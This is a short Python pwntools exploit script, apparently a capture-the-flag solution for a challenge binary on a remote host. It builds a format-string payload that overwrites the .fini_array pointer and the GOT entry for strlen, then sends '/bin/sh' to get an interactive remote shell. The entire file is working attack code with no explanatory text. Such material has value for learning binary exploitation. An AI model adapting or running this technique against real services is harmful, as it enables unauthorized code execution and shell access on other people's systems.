# -*- coding: utf-8 -*-
from pwn import *

context(log_level='debug')

p = remote("111.198.29.45",52277)
#p = process("./705a01731f634811bea3d3237f82415d")
elf = ELF("./705a01731f634811bea3d3237f82415d")
libc = ELF("/home/ubuntu/libc-database/db/libc6_2.15-0ubuntu20.2_i386.so")

fini_array = 0x08049934

#gdb.attach(p, "b * 0x804864f")

payload = "aa"+p32(fini_array) + p32(elf.got["strlen"])+p32(elf.got["strlen"]+2)+"%205d%12$hhn" + "%33699d%13$hn"+"%33652d%14$hn"

p.recvuntil("Please tell me your name...")
p.sendline(payload)


p.sendline("/bin/sh")
p.interactive()
